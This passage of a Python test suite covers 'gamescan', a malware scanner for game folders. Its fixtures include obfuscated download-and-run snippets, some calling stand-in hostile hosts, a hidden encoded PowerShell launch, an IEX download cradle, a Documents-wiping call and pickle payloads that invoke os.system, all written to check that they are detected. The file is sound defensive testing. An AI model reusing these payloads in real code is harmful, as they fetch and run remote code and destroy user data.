def vendor_signature(test, required):
    """Switch the vendor-signature rule for engine components for one test."""
    from gamescan.handlers import engine_files
    test.addCleanup(setattr, engine_files, "REQUIRE_VENDOR_SIGNATURE",
                    engine_files.REQUIRE_VENDOR_SIGNATURE)
    engine_files.REQUIRE_VENDOR_SIGNATURE = required


def signed_as(test, who):
    """Pretend Windows verified every scanned program as signed by ``who``
    (None: unsigned). Nothing is written to disk for the check."""
    from gamescan.handlers import engine_files
    test.addCleanup(setattr, engine_files, "_signer", engine_files._signer)
    engine_files._signer = lambda ctx: who


def suppressed(findings, rule_id=None):
    return [f for f in findings if f.suppressed and (rule_id is None or f.rule_id == rule_id)]


PAYLOAD = base64.b64encode(b"print('x')" * 4).decode()


class RenPyTests(unittest.TestCase):
    def setUp(self):
        self.s = Scanner()

    def test_obfuscated_downloader_is_critical_chain(self):
        src = ("init python:\n"
               "    import base64, urllib.request\n"
               "    data = urllib.request.urlopen(u).read()\n"
               "    exec(base64.b64decode(data))\n").encode()
        found = self.s.scan_bytes("game/script.rpy", src)
        hit = active(found, "PY-OBF-001")[0]
        self.assertEqual((hit.severity, hit.line), (Severity.CRITICAL, 4))
        self.assertTrue(active(found, "CHAIN-DOWNLOADER"))
        self.assertFalse(active(found, "CHAIN-LOADER"), "superseded by the downloader chain")

    def test_comment_and_docstring_matches_are_kept_but_suppressed(self):
        src = b'# os.system("calc")\ndef f():\n    """never call os.system("x") here"""\n    return 1\n'
        found = self.s.scan_bytes("game/a.rpy", src)
        self.assertEqual(len(suppressed(found, "PY-PROC-001")), 2)
        self.assertFalse(active(found))
        self.assertIn("comment", found[0].suppression_reason)

    def test_benign_and_unknown_urls(self):
        src = b'a = "https://www.renpy.org/doc"\nb = "https://evil-updates.example.net/x"\nc = "http://45.33.12.9:8080/a"\n'
        found = self.s.scan_bytes("game/a.rpy", src)
        self.assertEqual(len(suppressed(found, "URL-001")), 1)
        self.assertEqual(len(active(found, "URL-001")), 1)
        self.assertEqual(active(found, "URL-IP-001")[0].severity, Severity.HIGH)
        self.assertTrue(suppressed(self.s.scan_bytes("a.rpy", b'x = "http://127.0.0.1:8000/"\n'),
                                   "URL-IP-001"))

    def test_deletion_target_resolution(self):
        safe = self.s.scan_bytes("game/a.rpy", b"os.remove(os.path.join(config.savedir, name))\n")
        self.assertTrue(suppressed(safe, "PY-FS-001"))
        bad = self.s.scan_bytes("game/a.rpy", b'shutil.rmtree(os.path.expanduser("~/Documents"))\n')
        self.assertEqual(active(bad, "PY-FS-001")[0].severity, Severity.HIGH)

    def test_save_encoding_is_recognised(self):
        ok = self.s.scan_bytes("game/a.rpy", b"save_blob = base64.b64decode(persistent.save_data)\n")
        self.assertTrue(suppressed(ok, "PY-OBF-002"))
        bad = self.s.scan_bytes("game/a.rpy", b"blob = base64.b64decode(stage2)\n")
        self.assertTrue(active(bad, "PY-OBF-002"))

    def test_embedded_asset_blob(self):
        png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"\x01" * 300).decode()
        self.assertTrue(suppressed(self.s.scan_bytes("a.rpy", ('i = "%s"\n' % png).encode()),
                                   "OBF-BLOB-001"))
        exe = base64.b64encode(b"MZ" + b"\x07" * 300).decode()
        hit = active(self.s.scan_bytes("a.rpy", ('i = "%s"\n' % exe).encode()), "OBF-BLOB-001")[0]
        self.assertEqual(hit.severity, Severity.HIGH)

    def test_engine_baseline_and_strict_mode(self):
        src = b"import subprocess\nsubprocess.Popen(cmd)\n"
        self.assertTrue(suppressed(self.s.scan_bytes("renpy/editor.py", src), "PY-PROC-001"))
        strict = Scanner(strict=True)
        self.assertTrue(active(strict.scan_bytes("renpy/editor.py", src), "PY-PROC-001"))
        # CRITICAL findings are never hidden by a path baseline
        crit = self.s.scan_bytes("renpy/x.py", b"exec(zlib.decompress(blob))\n")
        self.assertTrue(active(crit, "PY-OBF-001"))


class JsShellTests(unittest.TestCase):
    def setUp(self):
        self.s = Scanner()

    def test_malicious_plugin(self):
        src = (b"const cp = require('child_process');\n"
               b"fetch('https://cdn.bad-host.example.org/p').then(r => r.text())\n"
               b"  .then(t => eval(atob(t)));\n")
        found = self.s.scan_bytes("js/plugins/Bonus.js", src)
        self.assertTrue(active(found, "JS-PROC-001"))
        self.assertTrue(active(found, "JS-OBF-001"))
        self.assertTrue(active(found, "CHAIN-DOWNLOADER"))

    def test_core_script_is_baseline_and_local_load_is_benign(self):
        core = b"function Utils() { throw new Error('static'); }\nvar x = eval(code);\n"
        self.assertFalse(active(self.s.scan_bytes("js/rpg_core.js", core)))
        fake = self.s.scan_bytes("js/rpg_core.js", b"var x = eval(code);\n")
        self.assertTrue(active(fake, "JS-EXEC-001"), "the name alone does not make it the core script")
        self.assertTrue(active(fake, "ENGINE-001"))
        src = b"var xhr = new XMLHttpRequest();\nxhr.open('GET', 'data/Map001.json');\n"
        self.assertTrue(suppressed(self.s.scan_bytes("js/plugins/Loader.js", src), "JS-NET-001"))

    def test_obfuscator_signature_needs_many_hits(self):
        few = b"var _0x1a2b = 1;\n" * 3
        many = b"".join(b"var _0x%04x = %d;\n" % (i, i) for i in range(40))
        self.assertFalse(self.s.scan_bytes("js/plugins/A.js", few))
        self.assertEqual(len(active(self.s.scan_bytes("js/plugins/A.js", many), "JS-OBF-003")), 1)

    def test_encoded_powershell_dropper(self):
        enc = base64.b64encode("Write-Host hello there, world".encode("utf-16-le")).decode()
        src = ("@echo off\nREM powershell -enc is not used here\n"
               "powershell -nop -w hidden -enc %s\n" % enc).encode()
        found = self.s.scan_bytes("install.bat", src)
        self.assertEqual(active(found, "SH-OBF-001")[0].severity, Severity.CRITICAL)
        self.assertTrue(active(found, "CHAIN-EVASIVE"))
        self.assertTrue(all(f.line == 2 for f in suppressed(found)))

    def test_double_extension(self):
        found = self.s.scan_bytes("readme.txt.bat", b"@echo off\necho hi\n")
        self.assertTrue(active(found, "NAME-001"))


class BinaryTests(unittest.TestCase):
    def setUp(self):
        self.s = Scanner()

    def test_parser_reads_sections_and_imports(self):
        pe = parse_pe(build_pe(["WriteProcessMemory", "CreateFileW"]))
        self.assertEqual(pe.sections[0].name, ".text")
        self.assertEqual(pe.imports["kernel32.dll"], ["WriteProcessMemory", "CreateFileW"])
        self.assertIn("CreateFile", pe.import_names)
        self.assertFalse(pe.is_dotnet)

    def test_import_table_verification(self):
        names = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "ExitProcess",
                 "GetLastError", "CloseHandle"]
        found = self.s.scan_bytes("tool.exe", build_pe(names))
        self.assertEqual(len(active(found, "INJ-001")), 3)
        self.assertIn("confirmed in import table", active(found, "INJ-001")[0].evidence)
        # the same names only as strings are not evidence of use
        benign = build_pe(names[3:] + ["Sleep", "GetTickCount"], strings=b"\0CreateRemoteThread\0")
        only_str = self.s.scan_bytes("tool.exe", benign)
        self.assertTrue(suppressed(only_str, "INJ-001"))
        self.assertFalse(active(only_str, "INJ-001"))

    def test_packer_and_disguise(self):
        packed = build_pe(["LoadLibraryA", "GetProcAddress"], section=b"UPX0", flags=0xE0000020)
        found = self.s.scan_bytes("img/title.png", packed)
        for rule in ("PE-PACK-001", "PE-PACK-003", "PE-PACK-004", "NAME-002"):
            self.assertTrue(active(found, rule), rule)

    def test_managed_assembly_routing(self):
        data = build_pe(["_CorExeMain"], dotnet=True,
                        strings=b"\0WebClient\0DownloadFile\0ProcessStartInfo\0ConfuserEx v1.0\0")
        found = self.s.scan_bytes("Game_Data/Managed/Assembly-CSharp.dll", data)
        self.assertTrue(all(f.handler == "dotnet" for f in found))
        self.assertTrue(active(found, "DN-NET-001"))
        self.assertTrue(active(found, "DN-PACK-001"))
        self.assertTrue(active(found, "CHAIN-FETCHRUN"))


class ScannerTests(unittest.TestCase):
    def test_directory_scan_report_and_allowlist(self):
        with tempfile.TemporaryDirectory() as tmp:
            os.makedirs(os.path.join(tmp, "game"))
            os.makedirs(os.path.join(tmp, "renpy"))
            script = os.path.join(tmp, "game", "script.rpy")
            with open(script, "w") as fh:
                fh.write('label start:\n    $ renpy.pause()\n    $ subprocess.Popen(["helper"])\n')
            with open(os.path.join(tmp, "renpy", "__init__.py"), "w") as fh:
                fh.write("import os\n")
            with open(os.path.join(tmp, "game", "bg.png"), "wb") as fh:
                fh.write(b"\x89PNG....")
            seen = []
            report = Scanner().scan(tmp, progress=lambda d, t, r: seen.append((d, t)))
            self.assertEqual(seen[-1], (3, 3))
            self.assertEqual((report.files_scanned, report.files_skipped), (3, 0))
            self.assertEqual(report.engines, ["Ren'Py"])
            self.assertEqual(report.verdict, "REVIEW")
            doc = json.loads(report.to_json())
            self.assertEqual(doc["stats"]["by_severity"]["MEDIUM"], 1)
            f = doc["findings"][0]
            for key in ("rule_id", "severity", "line", "snippet", "evidence", "confidence",
                        "reason", "sha256", "suppressed"):
                self.assertIn(key, f)
            self.assertEqual((f["file"], f["line"]), ("game/script.rpy", 3))

            allow = HashAllowlist(os.path.join(tmp, "allow.json"))
            allow.add(f["sha256"], "reviewed")
            allow.save()
            again = Scanner(allowlist=HashAllowlist(allow.path)).scan(tmp)
            self.assertEqual(again.verdict, "CLEAN")
            self.assertIn("allowlist", again.suppressed[0].suppression_reason)

    def test_rpa_archive_members_and_rpyc(self):
        member = b"init python:\n    exec(base64.b64decode(blob))\n"
        rpyc_body = zlib.compress(pickle.dumps(["os.system('calc.exe')"], 2))
        rpyc = b"RENPY RPC2" + struct.pack("<III", 1, 34, len(rpyc_body)) + b"\0" * 12 + rpyc_body
        key = 0x42424242
        blob = member + rpyc
        header_len = 34
        index = {"scripts/x.rpy": [(header_len ^ key, len(member) ^ key, b"")],
                 "scripts/y.rpyc": [((header_len + len(member)) ^ key, len(rpyc) ^ key, b"")],
                 "images/a.png": [(header_len ^ key, 4 ^ key, b"")]}
        packed = zlib.compress(pickle.dumps(index, 2))
        header = b"RPA-3.0 %016x %08x\n" % (header_len + len(blob), key)
        self.assertEqual(len(header), header_len)
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "archive.rpa"), "wb") as fh:
                fh.write(header + blob + packed)
            report = Scanner().scan(tmp)
        files = {f.file for f in report.active}
        self.assertEqual(files, {"archive.rpa!scripts/x.rpy", "archive.rpa!scripts/y.rpyc"})
        self.assertEqual(report.max_severity, Severity.CRITICAL)

    def test_hostile_archive_index_is_not_executed(self):
        class Boom:
            def __reduce__(self):
                return (os.system, ("echo pwned",))
        packed = zlib.compress(pickle.dumps({"a.rpy": Boom()}, 2))
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "evil.rpa"), "wb") as fh:
                fh.write(b"RPA-3.0 %016x %08x\n" % (34, 0) + packed)
            report = Scanner().scan(tmp)
        # nothing of it ran, and nothing failed - and the archive is not called clean: its
        # members were not read, and that is said (until 2026-10-12 it was not)
        self.assertEqual([(f.rule_id, f.severity, f.suppressed) for f in report.findings],
                         [("ARC-002", Severity.LOW, False)])
        self.assertIn("could not be read to its end", report.findings[0].evidence)
        self.assertNotEqual(str(report.verdict), "CLEAN")
        self.assertEqual(report.errors, [])

    def test_strict_flag_reaches_context(self):
        self.assertTrue(Scanner(strict=True).context.strict)
        self.assertIsInstance(Scanner().context, ContextEngine)


YARA_SAMPLE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                           "yara_rules", "game_threats.yar")


class YaraTests(unittest.TestCase):
    def rules(self, text):
        from gamescan.yara import YaraRuleSet
        rs = YaraRuleSet()
        rs.add_source(text, "test.yar")
        return rs

    def names(self, rs, data):
        return [m.rule.name for m in rs.match(data)]

    def test_strings_and_conditions(self):
        rs = self.rules(r'''
            rule text_mods { strings: $a = "PowerShell" nocase wide ascii  $b = "cat" fullword
                             condition: $a and not $b }
            rule hex_wild  { strings: $h = { 4D 5A ?? 00 [2-4] ( 01 | 02 ) 9? } condition: $h at 0 }
            rule counted   { strings: $x = "ab" condition: #x >= 3 and filesize < 1KB }
            rule sets      { strings: $s1 = "one" $s2 = "two" $t = "zzz"
                             condition: all of ($s*) and none of ($t) and 1 of them }
            rule magic     { condition: uint16(0) == 0x5A4D and uint32be(0) == 0x4D5A9000 }
            rule regexp    { strings: $r = /tok_[0-9a-f]{8}\b/i  condition: $r in (0..64) }
            private rule hidden { condition: true }
        ''')
        self.assertEqual((len(rs), rs.skipped), (7, []))
        self.assertEqual(self.names(rs, "run p\0o\0w\0e\0r\0s\0h\0e\0l\0l\0".encode("latin-1")), ["text_mods"])
        self.assertEqual(self.names(rs, b"POWERSHELL cat"), [])            # fullword $b present
        self.assertEqual(self.names(rs, b"powershell concat"), ["text_mods"])
        self.assertEqual(self.names(rs, b"MZ\x90\x00\xaa\xbb\xcc\x02\x9f"), ["hex_wild", "magic"])
        self.assertEqual(self.names(rs, b"ab ab ab one two"), ["counted", "sets"])
        self.assertEqual(self.names(rs, b"xx TOK_DEADBEEF yy"), ["regexp"])

    def test_unsupported_rules_are_skipped_not_passed(self):
        rs = self.rules('import "pe"\n'
                        'rule uses_module { condition: pe.is_dll }\n'
                        'rule uses_loop { strings: $a = "x" condition: for any i in (1..2) : ( $a ) }\n'
                        'rule fine { strings: $a = "needle" condition: $a }\n')
        self.assertEqual([r.name for r in rs.rules], ["fine"])
        self.assertEqual(len(rs.skipped), 2)
        self.assertEqual(self.names(rs, b"a needle"), ["fine"])

    def test_sample_rule_file_and_rule_engine(self):
        from gamescan import RuleEngine
        engine = RuleEngine()
        self.assertEqual(engine.load_yara(YARA_SAMPLE), 4)
        self.assertEqual(engine.yara.skipped, [])
        s = Scanner(rules=engine)
        found = s.scan_bytes("tool.ps1", b"IEX (New-Object Net.WebClient).DownloadString($u)\n")
        hit = [f for f in found if f.rule_id == "YARA:PowerShell_Download_Cradle"][0]
        self.assertEqual((hit.severity, hit.category.value), (Severity.HIGH, "EXECUTION"))
        self.assertIn("@ 0x", hit.evidence)
        # with signatures loaded, files no handler claims are scanned too
        stub = b"\x00" * 8 + b"This program cannot be run in DOS mode" + b"\x00" * 8
        found = s.scan_bytes("data/level.dat", stub)
        self.assertEqual([f.rule_id for f in found], ["YARA:Embedded_PE_In_Non_Executable"])
        self.assertEqual(Scanner().scan_bytes("data/level.dat", stub), [])


class UnpackTests(unittest.TestCase):
    def test_rpyc_is_decompiled_with_line_numbers(self):
        import types
        mod = types.ModuleType("renpy.ast")

        class PyCode(object):
            def __init__(self, source, line):
                self.state = (1, source, ("game/script.rpy", line), "exec")

            def __getstate__(self):
                return self.state

        class Say(object):
            def __init__(self, what):
                self.what = what

        for cls in (PyCode, Say):
            cls.__module__, cls.__qualname__ = "renpy.ast", cls.__name__
            setattr(mod, cls.__name__, cls)
        sys.modules["renpy"], sys.modules["renpy.ast"] = types.ModuleType("renpy"), mod
        try:
            tree = [Say("Hello there, traveller."),
                    PyCode("import base64\nexec(base64.b64decode(blob))", 12)]
            body = zlib.compress(pickle.dumps(({"version": 1}, tree), 2))
        finally:
            del sys.modules["renpy"], sys.modules["renpy.ast"]
        data = b"RENPY RPC2" + struct.pack("<III", 1, 34, len(body)) + b"\0" * 12 + body
        from gamescan.unpack import rpyc
        code, strings, exact = rpyc.decompile(data)
        self.assertTrue(exact)
        self.assertEqual(code.split("\n")[12], "exec(base64.b64decode(blob))")
        self.assertIn("Hello there, traveller.", strings)
        found = Scanner().scan_bytes("game/script.rpyc", data)
        crit = active(found, "PY-OBF-001")[0]
        self.assertEqual(crit.line, 13)

    def test_hostile_rpyc_pickle_runs_nothing(self):
        class Boom:
            def __reduce__(self):
                return (os.system, ("echo pwned > pwned.txt",))
        body = zlib.compress(pickle.dumps([Boom(), "os.system('x')"], 2))
        data = b"RENPY RPC2" + struct.pack("<III", 1, 34, len(body)) + b"\0" * 12 + body
        found = Scanner().scan_bytes("game/x.rpyc", data)
        self.assertFalse(os.path.exists("pwned.txt"))
        self.assertTrue(active(found, "PY-PROC-001"))      # still inspected as text

    @unittest.skipUnless(os.path.exists(r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll"),
                         "needs the .NET Framework")
    def test_dotnet_metadata_is_decompiled(self):
        from gamescan.unpack import dotnet_meta
        with open(r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll", "rb") as fh:
            data = fh.read()
        lines = dotnet_meta.decompile(data, parse_pe(data)).split("\n")
        self.assertIn("pinvoke crypt32.dll!CryptUnprotectData", lines)
        self.assertIn("ref System.Reflection.Assembly::Load", lines)
        self.assertTrue(any(l.startswith('string "') for l in lines))
        self.assertTrue(any(l.startswith("typeref System.") for l in lines))

    def test_lz4_and_unity_bundle_with_embedded_executable(self):
        from gamescan.unpack import unity
        self.assertEqual(unity.lz4_block(b"\x35abc\x03\x00"), b"abcabcabcabc")

        def literals(buf):
            n, out = len(buf), bytearray()
            if n < 15:
                out.append(n << 4)
            else:
                out.append(0xF0)
                rest = n - 15
                while rest >= 255:
                    out.append(255)
                    rest -= 255
                out.append(rest)
            return bytes(out) + buf

        inner = build_pe(["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                          "ExitProcess", "Sleep", "CloseHandle"])
        payload = b"UnityAssetData" * 20 + inner + b"tail" * 10
        block = literals(payload)
        info = (b"\0" * 16 + struct.pack(">I", 1) + struct.pack(">IIH", len(payload), len(block), 2)
                + struct.pack(">I", 1) + struct.pack(">qqI", 0, len(payload), 4) + b"CAB-test\0")
        cinfo = literals(info)
        head = b"UnityFS\0" + struct.pack(">I", 6) + b"5.x.x\0" + b"2019.4.0f1\0"
        head += struct.pack(">qIII", 0, len(cinfo), len(info), 2)
        bundle = head + cinfo + block
        content, was_bundle = unity.unpack(bundle)
        self.assertEqual((content, was_bundle), (payload, True))
        found = Scanner().scan_bytes("Game_Data/StreamingAssets/extra", bundle)   # no extension
        self.assertTrue(active(found, "UNITY-PE-001"))
        child = [f for f in found if "!embedded_0x" in f.file]
        self.assertEqual(len(active(child, "INJ-001")), 3)
        self.assertTrue(child[0].file.endswith(".exe"))


class EntropyTests(unittest.TestCase):
    def test_profiles(self):
        from gamescan import entropy
        text = b"The quick brown fox jumps over the lazy dog. " * 2000
        noise = os.urandom(200_000)
        self.assertEqual(entropy.profile(text).kind, "plain")
        prof = entropy.profile(noise)
        self.assertEqual(prof.kind, "encrypted")
        self.assertGreater(prof.high_fraction, 0.95)
        self.assertEqual(entropy.profile(zlib.compress(noise[:50_000] + text)).kind in
                         ("compressed", "encrypted"), True)
        self.assertEqual(entropy.shannon(b""), 0.0)

    def test_high_entropy_literal_and_overlay(self):
        import random
        rnd = random.Random(7)
        alphabet = "".join(chr(c) for c in range(33, 127) if chr(c) not in "'\"`\\")
        blob = "".join(rnd.choice(alphabet) for _ in range(300))
        s = Scanner()
        found = s.scan_bytes("game/a.rpy", ('key = "%s"\nname = "%s"\n' % (blob, "a" * 300)).encode())
        hit = active(found, "ENT-STR-001")
        self.assertEqual((len(hit), hit[0].line), (1, 1))
        names = ["ExitProcess", "Sleep", "CloseHandle", "GetLastError", "CreateFileW", "ReadFile"]
        plain = s.scan_bytes("tool.exe", build_pe(names) + b"A" * 60_000)
        self.assertFalse(active(plain, "PE-ENT-001"))
        packed = s.scan_bytes("tool.exe", build_pe(names) + os.urandom(60_000))
        hit = active(packed, "PE-ENT-001")[0]
        self.assertEqual(hit.severity, Severity.MEDIUM)
        self.assertIn("encrypted", hit.evidence)


class ReputationTests(unittest.TestCase):
    IMPORTS = ["ExitProcess", "Sleep", "CloseHandle", "GetLastError", "CreateFileW",
               "URLDownloadToFileA"]

    def client(self, responses, calls):
        import json as _json
        from gamescan.reputation import VirusTotalClient

        def fetch(url, headers):
            import time as _time
            calls.append((url, headers))
            sha = url.rsplit("/", 1)[1]
            answer = responses.get(sha, (404, None))
            status, stats = answer[0], answer[1]
            age_days = answer[2] if len(answer) > 2 else 400      # long-known unless stated
            attrs = {"last_analysis_stats": stats,
                     "first_submission_date": int(_time.time() - age_days * 86400)}
            body = _json.dumps({"data": {"attributes": attrs}}) if stats else ""
            return status, body.encode()
        return VirusTotalClient("KEY", min_interval=0, fetch=fetch, sleep=lambda s: None)

    def test_lookup_cache_and_errors(self):
        from gamescan.reputation import ReputationError
        calls = []
        vt = self.client({"aa": (200, {"malicious": 12, "suspicious": 1, "harmless": 0, "undetected": 58}),
                          "cc": (401, None)}, calls)
        rep = vt.lookup("AA")
        self.assertEqual((rep.malicious, rep.total, rep.clean), (12, 71, False))
        vt.lookup("aa")
        self.assertEqual(len(calls), 1, "second lookup must come from the cache")
        self.assertTrue(calls[0][0].endswith("/files/aa"))
        self.assertEqual(calls[0][1]["x-apikey"], "KEY")
        self.assertFalse(vt.lookup("bb").found)
        with self.assertRaises(ReputationError):
            vt.lookup("cc")

    def test_scan_verification_and_auto_quarantine(self):
        import hashlib
        from gamescan.quarantine import Quarantine
        good = build_pe(self.IMPORTS)
        evil = build_pe(self.IMPORTS, strings=b"\0evil-marker\0")
        gh, eh = hashlib.sha256(good).hexdigest(), hashlib.sha256(evil).hexdigest()
        calls = []
        vt = self.client({gh: (200, {"malicious": 0, "suspicious": 0, "harmless": 10, "undetected": 60}),
                          eh: (200, {"malicious": 31, "suspicious": 0, "harmless": 0, "undetected": 40})},
                         calls)
        with tempfile.TemporaryDirectory() as tmp:
            game = os.path.join(tmp, "game")
            os.makedirs(game)
            for name, data in (("good.exe", good), ("evil.exe", evil), ("new.exe", good + b"x")):
                with open(os.path.join(game, name), "wb") as fh:
                    fh.write(data)
            q = Quarantine(os.path.join(tmp, "q"))
            report = Scanner(reputation=vt, quarantine=q, auto_quarantine=True).scan(game)
            by = lambda name, rid: [f for f in report.findings if f.file == name and f.rule_id == rid]
            self.assertEqual(len(calls), 3)
            self.assertTrue(all(len(u.rsplit("/", 1)[1]) == 64 for u, _ in calls), "only hashes are sent")
            self.assertTrue(by("good.exe", "NET-PE-001")[0].suppressed)
            self.assertIn("VirusTotal", by("good.exe", "NET-PE-001")[0].suppression_reason)
            self.assertFalse(by("evil.exe", "NET-PE-001")[0].suppressed)
            self.assertEqual(by("evil.exe", "VT-001")[0].severity, Severity.CRITICAL)
            self.assertEqual(by("new.exe", "VT-003")[0].severity, Severity.LOW)
            # only the file with a HIGH/CRITICAL finding was isolated
            self.assertEqual(sorted(os.listdir(game)), ["good.exe", "new.exe"])
            self.assertEqual([e["sha256"] for e in report.quarantined], [eh])
            self.assertTrue(by("evil.exe", "VT-001")[0].quarantined)
            stored = q.list()[0]["stored"]
            with open(stored, "rb") as fh:
                self.assertNotEqual(fh.read(2), b"MZ", "quarantined copy must be neutralised")
            q.restore(q.list()[0]["id"])
            with open(os.path.join(game, "evil.exe"), "rb") as fh:
                self.assertEqual(fh.read(), evil)
            self.assertEqual((q.list(), os.path.exists(stored)), ([], False))

    CLEAN = {"malicious": 0, "suspicious": 0, "harmless": 10, "undetected": 60}

    def verdicts(self, stats, age_days, min_age=None):
        """Scan one executable whose VirusTotal answer is ``stats`` at ``age_days``."""
        import hashlib
        from gamescan.context import ContextEngine
        data = build_pe(self.IMPORTS)
        vt = self.client({hashlib.sha256(data).hexdigest(): (200, stats, age_days)}, [])
        with tempfile.TemporaryDirectory() as tmp:
            with open(os.path.join(tmp, "tool.exe"), "wb") as fh:
                fh.write(data)
            context = ContextEngine() if min_age is None else ContextEngine(vt_min_age_days=min_age)
            report = Scanner(reputation=vt, context=context).scan(tmp)
        return report, {f.rule_id: f for f in report.findings}

    def test_new_and_clean_is_not_trusted(self):
        report, by = self.verdicts(self.CLEAN, age_days=3)
        self.assertFalse(by["NET-PE-001"].suppressed, "0/70 on day 3 proves nothing")
        self.assertEqual(by["VT-004"].severity, Severity.LOW)
        self.assertIn("3 day(s) ago", by["VT-004"].evidence)          # the age is shown
        self.assertTrue(any("0 known clean" in n for n in report.notes))

    def test_old_and_clean_is_trusted_and_shows_its_age(self):
        report, by = self.verdicts(self.CLEAN, age_days=400)
        self.assertTrue(by["NET-PE-001"].suppressed)
        self.assertIn("known for 400 days", by["NET-PE-001"].suppression_reason)
        self.assertNotIn("VT-004", by)
        # the age is a setting
        _, strict_age = self.verdicts(self.CLEAN, age_days=400, min_age=1000)
        self.assertFalse(strict_age["NET-PE-001"].suppressed)
        _, lenient = self.verdicts(self.CLEAN, age_days=3, min_age=1)
        self.assertTrue(lenient["NET-PE-001"].suppressed)

    def test_old_with_one_detection_never_suppresses(self):
        stats = dict(self.CLEAN, malicious=1)
        report, by = self.verdicts(stats, age_days=400)
        self.assertFalse(by["NET-PE-001"].suppressed, "any detection rules out 'clean'")
        self.assertEqual(by["VT-002"].severity, Severity.MEDIUM)
        self.assertIn("400 day(s) ago", by["VT-002"].evidence)
        # an entry cached before the age was recorded has no age: never clean
        from gamescan.reputation import Reputation
        legacy = Reputation("ab" * 32, True, 0, 0, 10, 60)
        self.assertEqual((legacy.age_days(), legacy.is_clean()), (-1, False))

    def test_bad_key_stops_lookups_with_a_note(self):
        calls = []
        vt = self.client({}, calls)
        vt._fetch = lambda url, headers: (401, b"")
        with tempfile.TemporaryDirectory() as tmp:
            for name in ("a.exe", "b.exe"):
                with open(os.path.join(tmp, name), "wb") as fh:
                    fh.write(build_pe(self.IMPORTS, strings=name.encode()))
            report = Scanner(reputation=vt).scan(tmp)
        self.assertTrue(any("API key was rejected" in n for n in report.notes))
        self.assertFalse([f for f in report.findings if f.rule_id.startswith("VT-")])


class SignatureTrustTests(unittest.TestCase):
    IMPORTS = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "ExitProcess",
               "Sleep", "CloseHandle"]

    def scan(self, signer, strict=False, publishers=None, signed=True, blocklisted=False):
        """Scan a signed executable while pretending its signer is ``signer``."""
        import hashlib
        from gamescan import scanner as scanner_module
        from gamescan.context import ContextEngine
        from gamescan.signatures import SignatureDatabase
        original = scanner_module.trust.signer_name
        scanner_module.trust.signer_name = lambda path: signer
        self.addCleanup(setattr, scanner_module.trust, "signer_name", original)
        data = build_pe(self.IMPORTS, signed=signed)
        with tempfile.TemporaryDirectory() as tmp:
            db = None
            if blocklisted:
                db = SignatureDatabase(os.path.join(tmp, "sig.db"))
                db.add(hashlib.sha256(data).hexdigest(), "Trojan.Signed")
            os.makedirs(os.path.join(tmp, "g"))
            with open(os.path.join(tmp, "g", "tool.exe"), "wb") as fh:
                fh.write(data)
            context = ContextEngine(strict=strict, trusted_publishers=publishers)
            return Scanner(context=context, signatures=db).scan(os.path.join(tmp, "g")).findings

    def test_publisher_matching(self):
        from gamescan.context import ContextEngine
        engine = ContextEngine()
        for name in ("Microsoft Corporation", "Microsoft Windows", "Valve Corp.",
                     "Python Software Foundation", "unity technologies ApS"):
            self.assertTrue(engine.publisher_trusted(name), name)
        for name in ("Microsoftware Ltd", "Shady Software Ltd.", "", "Not Microsoft"):
            self.assertFalse(engine.publisher_trusted(name), name)
        self.assertTrue(ContextEngine(trusted_publishers=["Shady Software"])
                        .publisher_trusted("Shady Software Ltd."), "the list is editable")

    def test_a_changed_publisher_list_is_said_in_the_report(self):
        """phageo, 2026-10-19: the list stays editable in Settings, and a scan with a list that is
        not the built-in one says so in the report's notes - which names were added or left out."""
        from gamescan.context import TRUSTED_PUBLISHERS, ContextEngine
        from gamescan.scanner import publishers_changed

        def notes(publishers):
            with tempfile.TemporaryDirectory() as tmp:
                with open(os.path.join(tmp, "readme.txt"), "w") as fh:
                    fh.write("hello")
                scanner = Scanner(context=ContextEngine(trusted_publishers=publishers))
                return [n for n in scanner.scan(tmp).notes if n.startswith("Trusted publishers")]

        self.assertEqual(notes(None), [])
        same = [" %s " % p.upper() for p in reversed(TRUSTED_PUBLISHERS)]
        self.assertEqual(notes(same), [], "the built-in list in another order and case")
        said = notes(list(TRUSTED_PUBLISHERS[1:]) + ["Shady Software"])
        self.assertEqual(len(said), 1)
        self.assertIn("changed in Settings", said[0])
        self.assertIn("Added: shady software.", said[0])
        self.assertIn("Left out: %s." % TRUSTED_PUBLISHERS[0].lower(), said[0])
        self.assertIn("Left out: ", publishers_changed([]))

    def test_trusted_publisher_keeps_the_old_behaviour(self):
        found = self.scan("Valve Corp.")
        inj = [f for f in found if f.rule_id == "INJ-001"]
        self.assertTrue(inj and all(f.suppressed for f in inj))
        self.assertIn("trusted publisher: Valve Corp.", inj[0].suppression_reason)

    def test_other_valid_signature_lowers_one_level_and_names_the_signer(self):
        found = self.scan("Shady Software Ltd.")
        inj = active(found, "INJ-001")
        self.assertEqual(len(inj), 3, "not silenced")
        self.assertTrue(all(f.severity is Severity.MEDIUM for f in inj), "HIGH became MEDIUM")
        self.assertIn('valid signature from "Shady Software Ltd."', inj[0].reason)
        unsigned = active(self.scan(None), "INJ-001")
        self.assertTrue(all(f.severity is Severity.HIGH for f in unsigned))
        self.assertNotIn("signature", unsigned[0].reason)

    def test_critical_and_blocklist_are_never_affected(self):
        for signer in ("Valve Corp.", "Shady Software Ltd."):
            found = self.scan(signer, blocklisted=True)
            hit = active(found, "SIG-001")
            self.assertEqual([f.severity for f in hit], [Severity.CRITICAL], signer)
            self.assertNotIn("signature from", hit[0].reason)

    def test_strict_mode_ignores_signature_trust(self):
        for signer in ("Valve Corp.", "Shady Software Ltd."):
            inj = active(self.scan(signer, strict=True), "INJ-001")
            self.assertEqual([f.severity for f in inj], [Severity.HIGH] * 3, signer)

    def test_unsigned_file_is_never_asked_about_a_signer(self):
        inj = active(self.scan("Valve Corp.", signed=False), "INJ-001")
        self.assertEqual(len(inj), 3, "no signature directory, no trust")

    @unittest.skipUnless(sys.platform == "win32", "Windows only")
    def test_real_signer_name(self):
        from gamescan import trust
        self.assertEqual(trust.signer_name(sys.executable), "Python Software Foundation")
        self.assertIsNone(trust.signer_name(os.path.abspath(__file__)))


class DefenderTests(unittest.TestCase):
    MARK = "FAKE-MALWARE-MARKER"

